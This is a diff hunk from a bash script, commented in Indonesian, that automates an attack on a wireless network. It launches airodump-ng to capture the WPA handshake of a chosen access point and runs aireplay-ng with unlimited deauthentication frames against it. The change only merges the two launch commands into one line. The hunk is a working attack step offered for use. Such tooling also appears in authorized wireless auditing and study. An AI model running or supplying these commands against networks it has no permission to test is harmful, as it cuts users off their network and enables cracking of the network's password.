@@ -80,5 +80,4 @@ echo ""
 # Menangkap file handshake dari MAC address Access Point menggunakan airodump-ng pada interface yang dipilih
 echo "[*] Menangkap file handshake dari MAC address '${bssid_yang_dipilih}' menggunakan airodump-ng pada interface '${interface_yang_dipilih}'."
 sleep 3
-xterm -e "airodump-ng --bssid ${bssid_yang_dipilih} --channel ${channel_yang_dipilih} --write ${bssid_yang_dipilih} ${interface_yang_dipilih}" &
-xterm -e "aireplay-ng -0 0 -a ${bssid_yang_dipilih} ${interface_yang_dipilih}"
+xterm -e "airodump-ng --bssid ${bssid_yang_dipilih} --channel ${channel_yang_dipilih} --write ${bssid_yang_dipilih} ${interface_yang_dipilih}" & sleep 1 & xterm -e "aireplay-ng -0 0 -a ${bssid_yang_dipilih} ${interface_yang_dipilih}"
